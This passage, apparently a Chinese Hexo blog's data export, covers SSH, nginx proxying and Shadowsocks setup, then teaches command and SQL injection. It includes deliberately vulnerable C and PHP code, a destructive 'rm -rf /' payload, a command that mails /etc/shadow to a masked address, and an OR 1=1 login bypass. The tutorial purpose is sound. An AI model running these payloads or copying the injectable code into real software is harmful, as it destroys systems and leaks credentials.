ssh公钥私钥(authorized/id_rsa/id_rsa.pub)\n\t- 远程主机收到用户的登录请求，把自己的公钥发给用户\n\t- 用户使用这个公钥，将登录密码加密后，发送回来\n\t- 远程主机用自己的私钥，解密登录密码，如果密码正确，就同意用户登录\n3. ssh免密(公钥)登录\n\t- 用户将自己的公钥储存在远程主机上。\n\t- 登录的时候，远程主机会向用户发送一段随机字符串，用户用自己的私钥加密后，再发回来。\n\t- 远程主机用事先储存的公钥进行解密，如果成功，就证明用户是可信的，直接允许登录shell，不再要求密码\n\n<!--more-->\n\n## hosts文件问题\n为新租的 vps 设置简单的别名访问\n修改新租的 vps 中 hosts 文件，将百度域名转址为本机\n\n## Web服务器\nWeb服务器可以解析HTTP协议。当Web服务器接收到一个HTTP请求,会返回一个HTTP响应,例如送回一个HTML页面。为了处理一个请求Web服务器可以响应一个静态页面或图片，进行页面跳转或者把动态响应的产生委托给一些其它的程序例如CGI脚本，JSP脚本，servlets，ASP脚本，服务器端JavaScript，或者一些其它的服务器端技术。无论它们(译者注：脚本)的目的如何，这些服务器端的程序通常产生一个HTML的响应来让浏览器可以浏览。\n![](/images/WebServer.png)\n### apache vs. nginx\n- `nginx`优点\n\t- 轻量级，起 web 服务，比 apache 占用更少的内存及资源\n\t- 抗并发，nginx 处理请求是异步非阻塞的，而 apache 则是阻塞型的，在高并发下 nginx 能保持低资源低消耗高性能\n\t- 高度模块化的设计，编写模块相对简单\n\t- 社区活跃，各种高性能模块出品迅速\n- `apache`优点\n\t- rewrite ，比 nginx 的 rewrite 强大\n\t- 模块超多，基本想到的都可以找到\n\t- 少bug ，nginx 的 bug 相对较多\n\t- 非常稳定\n\n> apache是同步多进程模型，一个连接对应一个进程；nginx是异步的，多个连接（万级别）可以对应一个进程\n\n### nginx虚拟主机\n基于端口的虚拟主机\n基于域名的虚拟主机\n\n### nginx反向代理\n**反向代理**方式是指用代理服务器来接受 internet 上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给 internet 上请求连接的客户端，此时代理服务器对外就表现为一个反向代理服务器。\n\n举个例子，一个用户访问 http://www.example.com/readme ，但是 www.example.com 上并不存在 readme 页面，它是偷偷从另外一台服务器上取回来，然后作为自己的内容返回给用户。但是用户并不知情这个过程。对用户来说，就像是直接从 www.example.com 获取 readme 页面一样。这里所提到的 www.example.com 这个域名对应的服务器就设置了反向代理功能。\n\n![](http://upload-images.jianshu.io/upload_images/3257886-9188ef03eca4816f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/700)\n\n``` bash\nhttp {\n    include mime.types;\n    server_tokens off;\n\n\t## 下面配置反向代理的参数\n    server {\n        listen    80;\n\n        ## 1. 用户访问 http://ip:port，则反向代理到 https://github.com\n        location / {\n            proxy_pass  https://github.com;\n            proxy_redirect     off;\n            proxy_set_header   Host             $host;\n            proxy_set_header   X-Real-IP        $remote_addr;\n            proxy_set_header   X-Forwarded-For  $proxy_add_x_forwarded_for;\n        }\n\n        ## 2.用户访问 http://ip:port/README.md，则反向代理到\n        ##   https://github.com/.../README.md\n        location /README.md {\n            proxy_set_header  X-Real-IP  $remote_addr;\n            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n            proxy_pass https://github.com/moonbingbing/openresty-best-practices/blob/master/README.md;\n        }\n    }\n}\n```\n\n### 正向代理\n**正向代理**就像一个跳板，例如一个用户访问不了某网站（例如 www.google.com ），但是他能访问一个代理服务器，这个代理服务器能访问 www.google.com ，于是用户可以先连上代理服务器，告诉它需要访问的内容，代理服务器去取回来返回给用户。例如一些常见的翻墙工具、游戏代理就是利用正向代理的原理工作的。\n![](http://upload-images.jianshu.io/upload_images/3257886-b0ae8b42686a1424.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/700)\n\n\n### 安装 Shadowsocks Server\n1. 安装`python-pip`\n``` bash\nyum install python-pip\n```\n2. 安装`shadowsocks`\n``` bash\npip install shadowsocks\n```\n3. 配置 config.json\n``` json\n{\n\t\"server\":\"0.0.0.0\",\n\t\"server_port\":11210,\n\t\"local_address\":\"127.0.0.1\",\n\t\"local_port\":1080,\n\t\"password\":\"*******\",\n\t\"timeout\":600,\n\t\"method\":\"aes-256-cfb\",\n\t\"fast_open\": false,\n\t\"workers\": 1\n}\n```\n4. 运行 Shadowsocks server 脚本参数，设置配置文件路径\n5. 设置`rc.local`里设置开机运行","slug":"分享会资料","published":1,"updated":"2018-01-10T12:13:15.492Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgrjsd010039yp0l8vgwe603","content":"<h2 id=\"ssh\"><a href=\"#ssh\" class=\"headerlink\" title=\"ssh\"></a>ssh</h2><ol>\n<li>ssh服务端、客户端(ssh.config/sshd.config)端口修改</li>\n<li>ssh公钥私钥(authorized/id_rsa/id_rsa.pub)<ul>\n<li>远程主机收到用户的登录请求，把自己的公钥发给用户</li>\n<li>用户使用这个公钥，将登录密码加密后，发送回来</li>\n<li>远程主机用自己的私钥，解密登录密码，如果密码正确，就同意用户登录</li>\n</ul>\n</li>\n<li>ssh免密(公钥)登录<ul>\n<li>用户将自己的公钥储存在远程主机上。</li>\n<li>登录的时候，远程主机会向用户发送一段随机字符串，用户用自己的私钥加密后，再发回来。</li>\n<li>远程主机用事先储存的公钥进行解密，如果成功，就证明用户是可信的，直接允许登录shell，不再要求密码</li>\n</ul>\n</li>\n</ol>\n<a id=\"more\"></a>\n<h2 id=\"hosts文件问题\"><a href=\"#hosts文件问题\" class=\"headerlink\" title=\"hosts文件问题\"></a>hosts文件问题</h2><p>为新租的 vps 设置简单的别名访问<br>修改新租的 vps 中 hosts 文件，将百度域名转址为本机</p>\n<h2 id=\"Web服务器\"><a href=\"#Web服务器\" class=\"headerlink\" title=\"Web服务器\"></a>Web服务器</h2><p>Web服务器可以解析HTTP协议。当Web服务器接收到一个HTTP请求,会返回一个HTTP响应,例如送回一个HTML页面。为了处理一个请求Web服务器可以响应一个静态页面或图片，进行页面跳转或者把动态响应的产生委托给一些其它的程序例如CGI脚本，JSP脚本，servlets，ASP脚本，服务器端JavaScript，或者一些其它的服务器端技术。无论它们(译者注：脚本)的目的如何，这些服务器端的程序通常产生一个HTML的响应来让浏览器可以浏览。<br><img src=\"/images/WebServer.png\" alt=\"\"></p>\n<h3 id=\"apache-vs-nginx\"><a href=\"#apache-vs-nginx\" class=\"headerlink\" title=\"apache vs. nginx\"></a>apache vs. nginx</h3><ul>\n<li><code>nginx</code>优点<ul>\n<li>轻量级，起 web 服务，比 apache 占用更少的内存及资源</li>\n<li>抗并发，nginx 处理请求是异步非阻塞的，而 apache 则是阻塞型的，在高并发下 nginx 能保持低资源低消耗高性能</li>\n<li>高度模块化的设计，编写模块相对简单</li>\n<li>社区活跃，各种高性能模块出品迅速</li>\n</ul>\n</li>\n<li><code>apache</code>优点<ul>\n<li>rewrite ，比 nginx 的 rewrite 强大</li>\n<li>模块超多，基本想到的都可以找到</li>\n<li>少bug ，nginx 的 bug 相对较多</li>\n<li>非常稳定</li>\n</ul>\n</li>\n</ul>\n<blockquote>\n<p>apache是同步多进程模型，一个连接对应一个进程；nginx是异步的，多个连接（万级别）可以对应一个进程</p>\n</blockquote>\n<h3 id=\"nginx虚拟主机\"><a href=\"#nginx虚拟主机\" class=\"headerlink\" title=\"nginx虚拟主机\"></a>nginx虚拟主机</h3><p>基于端口的虚拟主机<br>基于域名的虚拟主机</p>\n<h3 id=\"nginx反向代理\"><a href=\"#nginx反向代理\" class=\"headerlink\" title=\"nginx反向代理\"></a>nginx反向代理</h3><p><strong>反向代理</strong>方式是指用代理服务器来接受 internet 上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给 internet 上请求连接的客户端，此时代理服务器对外就表现为一个反向代理服务器。</p>\n<p>举个例子，一个用户访问 <a href=\"http://www.example.com/readme\" target=\"_blank\" rel=\"external\">http://www.example.com/readme</a> ，但是 www.example.com 上并不存在 readme 页面，它是偷偷从另外一台服务器上取回来，然后作为自己的内容返回给用户。但是用户并不知情这个过程。对用户来说，就像是直接从 www.example.com 获取 readme 页面一样。这里所提到的 www.example.com 这个域名对应的服务器就设置了反向代理功能。</p>\n<p><img src=\"http://upload-images.jianshu.io/upload_images/3257886-9188ef03eca4816f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/700\" alt=\"\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http &#123;</span><br><span class=\"line\">    include mime.types;</span><br><span class=\"line\">    server_tokens off;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">## 下面配置反向代理的参数</span></span><br><span class=\"line\">    server &#123;</span><br><span class=\"line\">        listen    80;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">## 1. 用户访问 http://ip:port，则反向代理到 https://github.com</span></span><br><span class=\"line\">        location / &#123;</span><br><span class=\"line\">            proxy_pass  https://github.com;</span><br><span class=\"line\">            proxy_redirect     off;</span><br><span class=\"line\">            proxy_<span class=\"built_in\">set</span>_header   Host             <span class=\"variable\">$host</span>;</span><br><span class=\"line\">            proxy_<span class=\"built_in\">set</span>_header   X-Real-IP        <span class=\"variable\">$remote_addr</span>;</span><br><span class=\"line\">            proxy_<span class=\"built_in\">set</span>_header   X-Forwarded-For  <span class=\"variable\">$proxy_add_x_forwarded_for</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">## 2.用户访问 http://ip:port/README.md，则反向代理到</span></span><br><span class=\"line\">        <span class=\"comment\">##   https://github.com/.../README.md</span></span><br><span class=\"line\">        location /README.md &#123;</span><br><span class=\"line\">            proxy_<span class=\"built_in\">set</span>_header  X-Real-IP  <span class=\"variable\">$remote_addr</span>;</span><br><span class=\"line\">            proxy_<span class=\"built_in\">set</span>_header X-Forwarded-For <span class=\"variable\">$proxy_add_x_forwarded_for</span>;</span><br><span class=\"line\">            proxy_pass https://github.com/moonbingbing/openresty-best-practices/blob/master/README.md;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"正向代理\"><a href=\"#正向代理\" class=\"headerlink\" title=\"正向代理\"></a>正向代理</h3><p><strong>正向代理</strong>就像一个跳板，例如一个用户访问不了某网站（例如 www.google.com ），但是他能访问一个代理服务器，这个代理服务器能访问 www.google.com ，于是用户可以先连上代理服务器，告诉它需要访问的内容，代理服务器去取回来返回给用户。例如一些常见的翻墙工具、游戏代理就是利用正向代理的原理工作的。<br><img src=\"http://upload-images.jianshu.io/upload_images/3257886-b0ae8b42686a1424.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/700\" alt=\"\"></p>\n<h3 id=\"安装-Shadowsocks-Server\"><a href=\"#安装-Shadowsocks-Server\" class=\"headerlink\" title=\"安装 Shadowsocks Server\"></a>安装 Shadowsocks Server</h3><ol>\n<li><p>安装<code>python-pip</code></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install python-pip</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>安装<code>shadowsocks</code></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pip install shadowsocks</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>配置 config.json</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"attr\">\"server\"</span>:<span class=\"string\">\"0.0.0.0\"</span>,</span><br><span class=\"line\">\t<span class=\"attr\">\"server_port\"</span>:<span class=\"number\">11210</span>,</span><br><span class=\"line\">\t<span class=\"attr\">\"local_address\"</span>:<span class=\"string\">\"127.0.0.1\"</span>,</span><br><span class=\"line\">\t<span class=\"attr\">\"local_port\"</span>:<span class=\"number\">1080</span>,</span><br><span class=\"line\">\t<span class=\"attr\">\"password\"</span>:<span class=\"string\">\"*******\"</span>,</span><br><span class=\"line\">\t<span class=\"attr\">\"timeout\"</span>:<span class=\"number\">600</span>,</span><br><span class=\"line\">\t<span class=\"attr\">\"method\"</span>:<span class=\"string\">\"aes-256-cfb\"</span>,</span><br><span class=\"line\">\t<span class=\"attr\">\"fast_open\"</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\">\t<span class=\"attr\">\"workers\"</span>: <span class=\"number\">1</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>运行 Shadowsocks server 脚本参数，设置配置文件路径</p>\n</li>\n<li>设置<code>rc.local</code>里设置开机运行</li>\n</ol>\n","excerpt":"<h2 id=\"ssh\"><a href=\"#ssh\" class=\"headerlink\" title=\"ssh\"></a>ssh</h2><ol>\n<li>ssh服务端、客户端(ssh.config/sshd.config)端口修改</li>\n<li>ssh公钥私钥(authorized/id_rsa/id_rsa.pub)<ul>\n<li>远程主机收到用户的登录请求，把自己的公钥发给用户</li>\n<li>用户使用这个公钥，将登录密码加密后，发送回来</li>\n<li>远程主机用自己的私钥，解密登录密码，如果密码正确，就同意用户登录</li>\n</ul>\n</li>\n<li>ssh免密(公钥)登录<ul>\n<li>用户将自己的公钥储存在远程主机上。</li>\n<li>登录的时候，远程主机会向用户发送一段随机字符串，用户用自己的私钥加密后，再发回来。</li>\n<li>远程主机用事先储存的公钥进行解密，如果成功，就证明用户是可信的，直接允许登录shell，不再要求密码</li>\n</ul>\n</li>\n</ol>","more":"<h2 id=\"hosts文件问题\"><a href=\"#hosts文件问题\" class=\"headerlink\" title=\"hosts文件问题\"></a>hosts文件问题</h2><p>为新租的 vps 设置简单的别名访问<br>修改新租的 vps 中 hosts 文件，将百度域名转址为本机</p>\n<h2 id=\"Web服务器\"><a href=\"#Web服务器\" class=\"headerlink\" title=\"Web服务器\"></a>Web服务器</h2><p>Web服务器可以解析HTTP协议。当Web服务器接收到一个HTTP请求,会返回一个HTTP响应,例如送回一个HTML页面。为了处理一个请求Web服务器可以响应一个静态页面或图片，进行页面跳转或者把动态响应的产生委托给一些其它的程序例如CGI脚本，JSP脚本，servlets，ASP脚本，服务器端JavaScript，或者一些其它的服务器端技术。无论它们(译者注：脚本)的目的如何，这些服务器端的程序通常产生一个HTML的响应来让浏览器可以浏览。<br><img src=\"/images/WebServer.png\" alt=\"\"></p>\n<h3 id=\"apache-vs-nginx\"><a href=\"#apache-vs-nginx\" class=\"headerlink\" title=\"apache vs. nginx\"></a>apache vs. nginx</h3><ul>\n<li><code>nginx</code>优点<ul>\n<li>轻量级，起 web 服务，比 apache 占用更少的内存及资源</li>\n<li>抗并发，nginx 处理请求是异步非阻塞的，而 apache 则是阻塞型的，在高并发下 nginx 能保持低资源低消耗高性能</li>\n<li>高度模块化的设计，编写模块相对简单</li>\n<li>社区活跃，各种高性能模块出品迅速</li>\n</ul>\n</li>\n<li><code>apache</code>优点<ul>\n<li>rewrite ，比 nginx 的 rewrite 强大</li>\n<li>模块超多，基本想到的都可以找到</li>\n<li>少bug ，nginx 的 bug 相对较多</li>\n<li>非常稳定</li>\n</ul>\n</li>\n</ul>\n<blockquote>\n<p>apache是同步多进程模型，一个连接对应一个进程；nginx是异步的，多个连接（万级别）可以对应一个进程</p>\n</blockquote>\n<h3 id=\"nginx虚拟主机\"><a href=\"#nginx虚拟主机\" class=\"headerlink\" title=\"nginx虚拟主机\"></a>nginx虚拟主机</h3><p>基于端口的虚拟主机<br>基于域名的虚拟主机</p>\n<h3 id=\"nginx反向代理\"><a href=\"#nginx反向代理\" class=\"headerlink\" title=\"nginx反向代理\"></a>nginx反向代理</h3><p><strong>反向代理</strong>方式是指用代理服务器来接受 internet 上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给 internet 上请求连接的客户端，此时代理服务器对外就表现为一个反向代理服务器。</p>\n<p>举个例子，一个用户访问 <a href=\"http://www.example.com/readme\">http://www.example.com/readme</a> ，但是 www.example.com 上并不存在 readme 页面，它是偷偷从另外一台服务器上取回来，然后作为自己的内容返回给用户。但是用户并不知情这个过程。对用户来说，就像是直接从 www.example.com 获取 readme 页面一样。这里所提到的 www.example.com 这个域名对应的服务器就设置了反向代理功能。</p>\n<p><img src=\"http://upload-images.jianshu.io/upload_images/3257886-9188ef03eca4816f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/700\" alt=\"\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http &#123;</span><br><span class=\"line\">    include mime.types;</span><br><span class=\"line\">    server_tokens off;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">## 下面配置反向代理的参数</span></span><br><span class=\"line\">    server &#123;</span><br><span class=\"line\">        listen    80;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">## 1. 用户访问 http://ip:port，则反向代理到 https://github.com</span></span><br><span class=\"line\">        location / &#123;</span><br><span class=\"line\">            proxy_pass  https://github.com;</span><br><span class=\"line\">            proxy_redirect     off;</span><br><span class=\"line\">            proxy_<span class=\"built_in\">set</span>_header   Host             <span class=\"variable\">$host</span>;</span><br><span class=\"line\">            proxy_<span class=\"built_in\">set</span>_header   X-Real-IP        <span class=\"variable\">$remote_addr</span>;</span><br><span class=\"line\">            proxy_<span class=\"built_in\">set</span>_header   X-Forwarded-For  <span class=\"variable\">$proxy_add_x_forwarded_for</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">## 2.用户访问 http://ip:port/README.md，则反向代理到</span></span><br><span class=\"line\">        <span class=\"comment\">##   https://github.com/.../README.md</span></span><br><span class=\"line\">        location /README.md &#123;</span><br><span class=\"line\">            proxy_<span class=\"built_in\">set</span>_header  X-Real-IP  <span class=\"variable\">$remote_addr</span>;</span><br><span class=\"line\">            proxy_<span class=\"built_in\">set</span>_header X-Forwarded-For <span class=\"variable\">$proxy_add_x_forwarded_for</span>;</span><br><span class=\"line\">            proxy_pass https://github.com/moonbingbing/openresty-best-practices/blob/master/README.md;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"正向代理\"><a href=\"#正向代理\" class=\"headerlink\" title=\"正向代理\"></a>正向代理</h3><p><strong>正向代理</strong>就像一个跳板，例如一个用户访问不了某网站（例如 www.google.com ），但是他能访问一个代理服务器，这个代理服务器能访问 www.google.com ，于是用户可以先连上代理服务器，告诉它需要访问的内容，代理服务器去取回来返回给用户。例如一些常见的翻墙工具、游戏代理就是利用正向代理的原理工作的。<br><img src=\"http://upload-images.jianshu.io/upload_images/3257886-b0ae8b42686a1424.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/700\" alt=\"\"></p>\n<h3 id=\"安装-Shadowsocks-Server\"><a href=\"#安装-Shadowsocks-Server\" class=\"headerlink\" title=\"安装 Shadowsocks Server\"></a>安装 Shadowsocks Server</h3><ol>\n<li><p>安装<code>python-pip</code></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install python-pip</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>安装<code>shadowsocks</code></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pip install shadowsocks</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>配置 config.json</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"attr\">\"server\"</span>:<span class=\"string\">\"0.0.0.0\"</span>,</span><br><span class=\"line\">\t<span class=\"attr\">\"server_port\"</span>:<span class=\"number\">11210</span>,</span><br><span class=\"line\">\t<span class=\"attr\">\"local_address\"</span>:<span class=\"string\">\"127.0.0.1\"</span>,</span><br><span class=\"line\">\t<span class=\"attr\">\"local_port\"</span>:<span class=\"number\">1080</span>,</span><br><span class=\"line\">\t<span class=\"attr\">\"password\"</span>:<span class=\"string\">\"*******\"</span>,</span><br><span class=\"line\">\t<span class=\"attr\">\"timeout\"</span>:<span class=\"number\">600</span>,</span><br><span class=\"line\">\t<span class=\"attr\">\"method\"</span>:<span class=\"string\">\"aes-256-cfb\"</span>,</span><br><span class=\"line\">\t<span class=\"attr\">\"fast_open\"</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\">\t<span class=\"attr\">\"workers\"</span>: <span class=\"number\">1</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>运行 Shadowsocks server 脚本参数，设置配置文件路径</p>\n</li>\n<li>设置<code>rc.local</code>里设置开机运行</li>\n</ol>"},{"title":"代码注入","date":"2017-12-14T07:18:23.000Z","_content":"\n## c程序代码注入\nc程序:\n``` bash\n#include <stdio.h>\n\nint main(int argc, char *argv[])\n{\n\tchar src[100], dst[100], cmd[205] = \"cp \";\n\tprintf(\"Please enter name of source file:\");\n\tgets(src);\n\tstrcat(cmd, src);\n\tstrcat(cmd, \" \");\n\tprintf(\"Please enter name of destination file:\");\n\tgets(dst);\n\tstrcat(cmd, dst);\n\tsystem(cmd);\n\treturn 0;\n}\n```\n<!--more-->\n程序本身是要求输入一个拷贝源文件和拷贝目标文件，将源文件内容拷贝到目标文件,正常执行:\n![](/images/attacks.png)\n\n异常代码注入\n![](/images/attacks2.png)\n\n同时还能干这些事情\n删除根目录，你可以试试\n``` shell\ncp hello world; rm -rf / --no-preserve-root\n```\n将linux系统的密码文件通过邮件发送\n``` shell\ncp hello world; mail ****@****.com < /etc/shadow\n```\n\n## SQL代码注入\n`index.html`\n``` html\n<html>\n    <head>\n        <meta charset=\"UTF-8\">\n        <link rel=\"stylesheet\" href=\"https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/css/bootstrap.min.css\" integrity=\"sha384-PsH8R72JQ3SOdhVi3uxftmaW6Vc51MKb0q5P2rRUpPvrszuE4W1povHYgTpBfshb\" crossorigin=\"anonymous\">\n        <script src=\"https://code.jquery.com/jquery-3.2.1.slim.min.js\" integrity=\"sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN\" crossorigin=\"anonymous\"></script>\n<script src=\"https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.3/umd/popper.min.js\" integrity=\"sha384-vFJXuSJphROIrBnz7yo7oB41mKfc8JzQZiCq4NCceLEaO4IHwicKwpJf9c9IpFgh\" crossorigin=\"anonymous\"></script>\n<script src=\"https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js\" integrity=\"sha384-alpBpkh1PFOepccYVYDB4do5UnbKysX5WZXm3XxPqe5iKTfUKjNkCk9SaVuEZflJ\" crossorigin=\"anonymous\"></script>\n        <title>sql 注入测试</title>\n    </head>\n    <body>\n        <div class=\"card\" style=\"width: 20rem;\">\n            <div class=\"card-body\">\n                <form method=\"POST\" action=\"index.php\">\n                    <div class=\"form-group\">\n                    <label class=\"col-form-label\" for=\"formGroupExampleInput\">SQL query</label>\n                    <input type=\"text\" class=\"form-control\" name=\"content\" id=\"content\" placeholder=\"Example input\">\n                    </div>\n                    <button type=\"submit\" class=\"btn btn-primary\">Submit</button>\n                </form>\n            </div>\n        </div>\n    </body>\n</html>\n```\n`index.php`\n``` php\n<html>\n    <head>\n        <meta charset=\"UTF-8\">\n        <link rel=\"stylesheet\" href=\"https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/css/bootstrap.min.css\" integrity=\"sha384-PsH8R72JQ3SOdhVi3uxftmaW6Vc51MKb0q5P2rRUpPvrszuE4W1povHYgTpBfshb\" crossorigin=\"anonymous\">\n        <script src=\"https://code.jquery.com/jquery-3.2.1.slim.min.js\" integrity=\"sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN\" crossorigin=\"anonymous\"></script>\n        <script src=\"https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.3/umd/popper.min.js\" integrity=\"sha384-vFJXuSJphROIrBnz7yo7oB41mKfc8JzQZiCq4NCceLEaO4IHwicKwpJf9c9IpFgh\" crossorigin=\"anonymous\"></script>\n        <script src=\"https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js\" integrity=\"sha384-alpBpkh1PFOepccYVYDB4do5UnbKysX5WZXm3XxPqe5iKTfUKjNkCk9SaVuEZflJ\" crossorigin=\"anonymous\"></script>\n        <title>SQL 注入</title>\n    </head>\n    <body>\n        <?php\n        if ($_POST[content]) {\n            $db_host = \"localhost\";\n            $db_user = \"my_user\";\n            $db_password = \"my_password\";\n            $db_name = \"my_db\";\n            $content = $_POST[content];\n            $query = \"SELECT * FROM users WHERE name = '$content'\";\n\n            $conn = mysqli_connect($db_host,$db_user,$db_password,$db_name);\n            $result = mysqli_query($conn, $query);\n\n            var_dump();\n            if (mysqli_num_rows($result)) {\n                while ($row = mysqli_fetch_array($result)) {\n                    echo \"Your name is \" . $row[1] . \"</br>\";\n\n                }\n            } else {\n                echo \"No Found!\";\n            }\n            mysqli_close($conn);\n        } else {\n            var_dump($_POST);\n            echo \"Don't get your content!\";\n        }\n        ?>\n    </body>\n</html>\n```\n表中数据\n![](/images/sql1.png)\n正常输入\n![](/images/sql2.png)\n![](/images/sql3.png)\n![](/images/sql4.png)\n![](/images/sql5.png)\n异常输入\n![](/images/sql6.png)\n![](/images/sql7.png)\n\n问题在于`SELECT * FROM users WHERE name = '$content'`在接收前端输入的字符串时，直接拼接查询语句,当输入为`hello' OR 1=1 #`时,将语句拼接完成就是`SELECT * FROM users WHERE name = 'hello' OR 1=1 #'`,其中`hello`后的一个单引号将查询语句的第一个单引号关闭了,接下来就是`OR`语句的真子句,最后将多余的单引号注释掉,那么这个查询永远为真,查询语句就会将数据库中所有的数据都返回。\n\n## SQL注入续\n`low.php`\n``` php\n<?php\n\n$db_host = \"localhost\";\n$db_user = \"my_user\";\n$db_password = \"my_password\";\n$db_name = \"my_db\";\n\n$user = $_POST[ 'username' ];\n\n$pass = $_POST[ 'password' ];\n$pass = md5( $pass );\n\n$query  = \"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';\";\n$conn = mysqli_connect($db_host,$db_user,$db_password,$db_name);\n$result = mysqli_query($conn, $query);\n\nif( $result && mysqli_num_rows( $result ) == 1 ) {\n\t$row    = mysqli_fetch_assoc( $result );\n\t$avatar = $row[\"avatar\"];\n\n\techo \"<p>Welcome to the password protected area {$user}</p>\";\n\techo \"<img src=\\\"{$avatar}\\\" />\";\n}\nelse {\n\techo \"<pre><br />Username and/or password incorrect.</pre>\";\n}\n\nmysqli_close($conn);\n?>\n```\n\n`medium.php`\n``` php\n<?php\n\n$db_host = \"localhost\";\n$db_user = \"my_user\";\n$db_password = \"my_password\";\n$db_name = \"my_db\";\n$conn = mysqli_connect($db_host,$db_user,$db_password,$db_name);\n\n$user = $_POST[ 'username' ];\n\n$pass = $_POST[ 'password' ];\n$user = mysqli_real_escape_string($conn, $user);\n$pass = mysqli_real_escape_string($conn, $pass);\n$pass = md5( $pass );\n\n$query  = \"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';\";\n$result = mysqli_query($conn, 